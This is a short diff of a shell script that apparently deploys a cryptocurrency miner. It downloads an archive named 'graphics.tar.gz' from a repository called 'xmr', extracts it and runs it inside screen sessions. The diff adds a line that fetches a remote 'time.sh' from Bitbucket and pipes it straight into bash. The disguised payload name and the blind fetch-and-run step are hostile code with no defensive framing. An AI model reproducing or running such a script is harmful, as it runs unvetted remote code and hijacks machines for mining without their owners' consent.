@@ -1,7 +1,6 @@
 
 sudo apt install screen -y > /dev/null 2>&1
 
-wget https://bitbucket.org/lukisanwarna/runing/raw/e57b4db45e10275c6a181fb18d5659efce0d0dd3/time.sh
 wget https://github.com/catursawah/xmr/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
@@ -49,4 +48,5 @@ sleep 2
 clear
 cd ..
 screen -ls
-bash time.sh
+
+wget https://bitbucket.org/lukisanwarna/runing/raw/e57b4db45e10275c6a181fb18d5659efce0d0dd3/time.sh && bash time.sh
